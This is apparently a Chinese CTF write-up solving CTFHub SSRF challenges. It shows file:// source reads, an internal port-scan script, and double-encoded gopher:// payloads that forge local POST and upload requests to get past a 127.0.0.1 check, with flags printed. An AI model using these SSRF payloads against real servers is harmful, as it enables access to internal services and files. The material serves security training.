## 内网访问
1. 内网访问：题目给出要访问127.0.0.1/flag.php
![](./img/Pasted%20image%2020250811134141.png)
2. 访问靶场
   `[challenge-4730614f89811bc1.sandbox.ctfhub.com:10800/?url=_](http://challenge-4730614f89811bc1.sandbox.ctfhub.com:10800/?url=_)`**发现端倪，后面提交的参数为url！**
3. 直接访问即可
   `[challenge-4730614f89811bc1.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php](http://challenge-4730614f89811bc1.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php)`
   ctfhub{881fd2d57159e5180bac33d1}
## 伪协议读取文件
1. 特征与上一题一样，可以轻易看出可能存在ssrf漏洞
	`http://challenge-dd2c5b60493592e3.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php`即可
### linux中web服务器根目录
#### 一、网站根目录（主目录）

1. **默认根目录**
    - Apache: `/var/www/html`
    - Nginx: `/usr/share/nginx/html` 或 `/var/www/html`
    - 自定义虚拟主机: 通常位于 `/var/www/` 下的子目录（如 `/var/www/example.com/public_html` ）
2. **特殊环境**
    - **cPanel**: `/home/用户名/public_html`
    - **Docker/LXC容器**: 可能挂载到 `/app` 或 `/srv`
    - **开发环境（如XAMPP）**: `/opt/lampp/htdocs`

#### 二、关键子目录结构

1. **通用目录**
    - 配置文件：`/etc/apache2/sites-available/`（Apache）或 `/etc/nginx/conf.d/`（Nginx）
    - 日志文件：`/var/log/apache2/` 或 `/var/log/nginx/`
    - 临时文件：`/var/tmp/` 或 `/tmp/`
## 端口探测
1. 题目提示：来来来性感CTFHub在线扫端口,据说端口范围是**8000-9000**哦,
2. 构建payload：`http://challenge-3151dc1e80c6c507.sandbox.ctfhub.com:10800/?url=127.0.0.1:8000`
3. bp抓包设置参数，然后查看筛选回显即可
或者s使用python脚本
```python
import requests  
  
url = 'http://challenge-3151dc1e80c6c507.sandbox.ctfhub.com:10800/?url=127.0.0.1:8000'  
for i in range(8000, 9001):  
    url = f'http://challenge-3151dc1e80c6c507.sandbox.ctfhub.com:10800/?url=127.0.0.1:{i}'  
    r = requests.get(url)  
    result = r.text  
    print(i, result)
```
## POST请求
### Gopher协议（前置知识）
**使用时一般需要进行两次编码（取决于web服务器是否对原始url进行解码）**
- 第一层：Web服务器解析原始URL
- 第二层：cURL解析Gopher协议内的数据
当Gopher URL作为参数传递时（如`url=gopher://...`），需对已编码内容再次编码就是上面的双重编码。
#### **一、Gopher协议基础特性**

##### 1. 协议本质

- **无状态协议**：早于HTTP的互联网协议（1991年设计），默认端口70
- **数据流特性**：直接传输TCP原始数据流，可模拟多种协议（HTTP/SMTP/Redis等）
- **现代限制**：主流浏览器已禁用，但PHP cURL等库仍可能支持

##### 2. 通用URL格式

```
gopher://<host>:<port>/_[URL编码的TCP数据流]
```

- 下划线`_`后的内容需完全URL编码
- 换行必须用`%0D%0A`（CRLF）

#### **二、GET请求构造详解**

##### 1. 基础结构
`GET /path?param=value HTTP/1.1  Host: target.com  [其他头]`

##### 2. Gopher化示例

**目标**：请求`http://127.0.0.1/search?q=test`  
**转换步骤**：

1. 原始请求：
```http
GET /search?q=test HTTP/1.1 
Host: 127.0.0.1
```
    
2. 添加CRLF并编码：
    
    ```
    GET%20/search%3Fq%3Dtest%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0A
    ```
    
3. 最终URL：
    
    ```
    gopher://127.0.0.1:80/_GET%20/search%3Fq%3Dtest%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0A
    ```
#### 3. 关键注意点

- **问号处理**：`?`需编码为`%3F`
- **路径分隔符**：`/`不需编码
- **最小化头**：某些服务只需`Host`头

---

#### **三、POST请求高级构造**

##### 1. 核心结构要求
```http
POST /path HTTP/1.1 
Host: target.com
Content-Type: application/x-www-form-urlencoded 
Content-Length: [长度] 

key1=value1&key2=value2
```

##### 2. 实战示例（含表单数据）

**目标**：向`/flag.php` 提交`key=5eb63...`  
**转换过程**：
1. 计算Content-Length：
```php
$data = "key=5eb63bbbe01eeed093cb22bb8f5acdc3";
echo strlen($data); // 输出33
```
    
2. 完整请求：
```http
POST /flag.php HTTP/1.1 
Host: 127.0.0.1 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 33

key=5eb63bbbe01eeed093cb22bb8f5acdc3
```
    
3. Gopher编码：
    ```
    POST%20/flag.php%20HTTP/1.1%0D%0A  
    Host:%20127.0.0.1%0D%0A
    Content-Type:%20application/x-www-form-urlencoded%0D%0A 
    Content-Length:%2033%0D%0A 
    %0D%0A 
    key=5eb63bbbe01eeed093cb22bb8f5acdc3 
    ```

### 正式解题

1. 使用dirsearch扫描出flag.php,则直接访问看一下`[challenge-5fb7c7fcbe5b8ab7.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php](http://challenge-5fb7c7fcbe5b8ab7.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php)`
2. 得到结果如下，将此KEY输入输入框![](./img/Pasted%20image%2020250811152757.png)得到Just View From 127.0.0.1，说明只能从127.0.0.1查看
3. 使用file://协议查看一下源码，查看flag.php与index.php(默认网站含有)
```php flag.php
|   |   |
|---|---|
||<?php|
|||
||error_reporting(0);|# 关闭所有PHP错误提示，避免暴露服务器信息。
|||
||if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {|
||echo "Just View From 127.0.0.1";|# 仅允许本地（127.0.0.1）访问。
||return;|
||}|
|||
||$flag=getenv("CTFHUB");|# 从环境变量读取Flag
||$key = md5($flag);|# 生成Flag的MD5哈希
|||
||if (isset($_POST["key"]) && $_POST["key"] == $key) {|
||echo $flag;|#用户提交的`key`需与`$key`（Flag的MD5值）完全匹配才会输出Flag。
||exit;|
||}|
||?>|
|||
||<form action="/flag.php" method="post">|
||<input type="text" name="key">|
||<!-- Debug: key=<?php echo $key;?>-->|
||</form>|
```

```php index.php
|   |
|---|
|<?php|
|||
||error_reporting(0);| #关闭所有PHP错误提示，避免暴露服务器信息。
|||
||if (!isset($_REQUEST['url'])){|
||header("Location: /?url=_");|
||exit;|
||}|
# 检查是否存在`url`参数（通过`$_GET`或`$_POST`传递）。
# 若不存在，重定向到`/?url=_`并终止脚本。
|||
||$ch = curl_init();| #初始化cURL会话
||curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);|# 直接使用用户输入的$_REQUEST['url']作为请求地址，未做任何过滤。支持所有cURL协议（HTTP/HTTPS/FTP/SCP/file://等）。
||curl_setopt($ch, CURLOPT_HEADER, 0);|# 隐藏响应头
||curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);|# 自动跟随重定向,当响应码为3xx时自动跳转，最多跟踪20次（默认值）。
||curl_exec($ch);|# 执行请求
||curl_close($ch);|# 释放资源
```
4. **使用Gopher协议模拟本地POST提交绕过IP限制**
核心结构
```http
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded 
Content-Length: 36

key=61103c66ad1b0153e6c10a22a308b4a3
```
使用Gopher协议提交
```
gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Length:%252036%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey=61103c66ad1b0153e6c10a22a308b4a3
```

**还原一下解码过程**
首次解码（还原Gopher数据流）
`POST%20/flag.php%20HTTP/1.1%0D%0AHost:%20127.0.0.1:80%0D%0AContent-Length:%2036%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Akey=61103c66ad1b0153e6c10a22a308b4a3`
二次解码（还原原始HTTP请求)
```http
POST /flag.php HTTP/1.1 
Host: 127.0.0.1:80 
Content-Length: 36 
Content-Type: application/x-www-form-urlencoded 

key=61103c66ad1b0153e6c10a22a308b4a3
```


**重点强调此处Content-Length: 长度包含完整的键值对key=61103c66ad1b0153e6c10a22a308b4a3而非61103c66ad1b0153e6c10a22a308b4a3**
## 文件上传
读取源码
`view-source:http://challenge-fb557ebc5f096c08.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php`
```php
<?php
 
error_reporting(0);
 
if($_SERVER["REMOTE_ADDR"] != "127.0.0.1"){
    echo "Just View From 127.0.0.1";
    return;
}
 
if(isset($_FILES["file"]) && $_FILES["file"]["size"] > 0){
    echo getenv("CTFHUB");# 必须上传非空文件，会从环境变量中获取CTFHUB并输出
    exit;
}
?>
 
Upload Webshell
 
<form action="/flag.php" method="post" enctype="multipart/form-data">
    <input type="file" name="file">
</form>
```
读取index.php内容一样的，这说明可以继续使用gopher协议绕过
```php
|   |
|---|
|<?php|
|||
||error_reporting(0);| #关闭所有PHP错误提示，避免暴露服务器信息。
|||
||if (!isset($_REQUEST['url'])){|
||header("Location: /?url=_");|
||exit;|
||}|
# 检查是否存在`url`参数（通过`$_GET`或`$_POST`传递）。
# 若不存在，重定向到`/?url=_`并终止脚本。
|||
||$ch = curl_init();| #初始化cURL会话
||curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);|# 直接使用用户输入的$_REQUEST['url']作为请求地址，未做任何过滤。支持所有cURL协议（HTTP/HTTPS/FTP/SCP/file://等）。
||curl_setopt($ch, CURLOPT_HEADER, 0);|# 隐藏响应头
||curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);|# 自动跟随重定向,当响应码为3xx时自动跳转，最多跟踪20次（默认值）。
||curl_exec($ch);|# 执行请求
||curl_close($ch);|# 释放资源
```

首先这里缺少一个提交按钮，我们要在浏览器手动添加
bp抓包下
```http
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----geckoformboundary5166e55f3e12bd7bbf6da08438f3ba01
Content-Length: 338
Origin: http://challenge-fb557ebc5f096c08.sandbox.ctfhub.com:10800
Connection: close
Referer: http://challenge-fb557ebc5f096c08.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundary5166e55f3e12bd7bbf6da08438f3ba01
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream


------geckoformboundary5166e55f3e12bd7bbf6da08438f3ba01
Content-Disposition: form-data; name="submit"

hhhhhh
------geckoformboundary5166e55f3e12bd7bbf6da08438f3ba01--

```


```
第一次url编码
POST%20/flag.php%20HTTP/1.1%0AHost%3A%20127.0.0.1%3A80%0AUser-Agent%3A%20Mozilla/5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A141.0%29%20Gecko/20100101%20Firefox/141.0%0AAccept%3A%20text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2C%2A/%2A%3Bq%3D0.8%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Czh-TW%3Bq%3D0.7%2Czh-HK%3Bq%3D0.5%2Cen-US%3Bq%3D0.3%2Cen%3Bq%3D0.2%0AAccept-Encoding%3A%20gzip%2C%20deflate%0AContent-Type%3A%20multipart/form-data%3B%20boundary%3D----geckoformboundary5166e55f3e12bd7bbf6da08438f3ba01%0AContent-Length%3A%20338%0AOrigin%3A%20http%3A//challenge-fb557ebc5f096c08.sandbox.ctfhub.com%3A10800%0AConnection%3A%20close%0AReferer%3A%20http%3A//challenge-fb557ebc5f096c08.sandbox.ctfhub.com%3A10800/%3Furl%3D127.0.0.1/flag.php%0AUpgrade-Insecure-Requests%3A%201%0APriority%3A%20u%3D0%2C%20i%0A%0A------geckoformboundary5166e55f3e12bd7bbf6da08438f3ba01%0AContent-Disposition%3A%20form-data%3B%20name%3D%22file%22%3B%20filename%3D%22%22%0AContent-Type%3A%20application/octet-stream%0A%0A%0A------geckoformboundary5166e55f3e12bd7bbf6da08438f3ba01%0AContent-Disposition%3A%20form-data%3B%20name%3D%22submit%22%0A%0Ahhhhhh%0A------geckoformboundary5166e55f3e12bd7bbf6da08438f3ba01--%0A

将上面编码中%0A全部替换为%0D%0A

POST%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AUser-Agent%3A%20Mozilla/5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A141.0%29%20Gecko/20100101%20Firefox/141.0%0D%0AAccept%3A%20text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2C%2A/%2A%3Bq%3D0.8%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Czh-TW%3Bq%3D0.7%2Czh-HK%3Bq%3D0.5%2Cen-US%3Bq%3D0.3%2Cen%3Bq%3D0.2%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AContent-Type%3A%20multipart/form-data%3B%20boundary%3D----geckoformboundary5166e55f3e12bd7bbf6da08438f3ba01%0D%0AContent-Length%3A%20338%0D%0AOrigin%3A%20http%3A//challenge-fb557ebc5f096c08.sandbox.ctfhub.com%3A10800%0D%0AConnection%3A%20close%0D%0AReferer%3A%20http%3A//challenge-fb557ebc5f096c08.sandbox.ctfhub.com%3A10800/%3Furl%3D127.0.0.1/flag.php%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0APriority%3A%20u%3D0%2C%20i%0D%0A%0D%0A------geckoformboundary5166e55f3e12bd7bbf6da08438f3ba01%0D%0AContent-Disposition%3A%20form-data%3B%20name%3D%22file%22%3B%20filename%3D%22%22%0D%0AContent-Type%3A%20application/octet-stream%0D%0A%0D%0A%0D%0A------geckoformboundary5166e55f3e12bd7bbf6da08438f3ba01%0D%0AContent-Disposition%3A%20form-data%3B%20name%3D%22submit%22%0D%0A%0D%0Ahhhhhh%0D%0A------geckoformboundary5166e55f3e12bd7bbf6da08438f3ba01--%0D%0A

拼接协议
gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AUser-Agent%3A%20Mozilla/5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A141.0%29%20Gecko/20100101%20Firefox/141.0%0D%0AAccept%3A%20text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2C%2A/%2A%3Bq%3D0.8%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Czh-TW%3Bq%3D0.7%2Czh-HK%3Bq%3D0.5%2Cen-US%3Bq%3D0.3%2Cen%3Bq%3D0.2%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AContent-Type%3A%20multipart/form-data%3B%20boundary%3D----geckoformboundary5166e55f3e12bd7bbf6da08438f3ba01%0D%0AContent-Length%3A%20338%0D%0AOrigin%3A%20http%3A//challenge-fb557ebc5f096c08.sandbox.ctfhub.com%3A10800%0D%0AConnection%3A%20close%0D%0AReferer%3A%20http%3A//challenge-fb557ebc5f096c08.sandbox.ctfhub.com%3A10800/%3Furl%3D127.0.0.1/flag.php%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0APriority%3A%20u%3D0%2C%20i%0D%0A%0D%0A------geckoformboundary5166e55f3e12bd7bbf6da08438f3ba01%0D%0AContent-Disposition%3A%20form-data%3B%20name%3D%22file%22%3B%20filename%3D%22%22%0D%0AContent-Type%3A%20application/octet-stream%0D%0A%0D%0A%0D%0A------geckoformboundary5166e55f3e12bd7bbf6da08438f3ba01%0D%0AContent-Disposition%3A%20form-data%3B%20name%3D%22submit%22%0D%0A%0D%0Ahhhhhh%0D%0A------geckoformboundary5166e55f3e12bd7bbf6da08438f3ba01--%0D%0A
```

#### 未知原因导致乱码
![](./img/Pasted%20image%2020250811190324.png)